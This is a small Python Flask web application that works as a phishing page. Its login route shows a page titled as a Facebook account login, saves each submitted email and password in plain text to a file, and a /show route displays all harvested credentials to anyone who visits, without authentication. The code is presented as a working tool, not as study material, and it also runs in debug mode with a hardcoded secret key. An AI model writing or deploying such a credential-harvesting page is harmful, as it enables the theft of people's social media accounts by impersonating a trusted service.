# coding: utf-8
from flask import Flask, render_template, request, url_for, make_response, abort, redirect, session  # noqa

app = Flask(__name__)
app.secret_key = "[\xd1\xf3W\xa1\xee\x81R\xa2\x10\x12$ME@\xad\xe5\x86av\xe5l\xae\xa2\xa3gT\xdd\x94vD6\x88,_\x0c\xa2\x94\xda\xc5"  # noqa


@app.route('/')
def index():
    return render_template('index.html', title='Index !!')


@app.route('/show')
def show():
    with open('pp.txt', 'r') as f:
        texts = f.read()
    return texts.replace('\n', '<br/>')

def index():
    return render_template('index.html', title='Index !!')


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        with open('pp.txt', 'a') as f:
            f.write(email + '\n')
            f.write(password + '\n')
            f.write('-'*10 + '\n')
            f.close()
        return 'ok'
    else:
        return render_template('login.html', title='Login Useing Facebook Account')  # noqa


if __name__ == '__main__':
    app.run(debug=True, use_reloader=True)
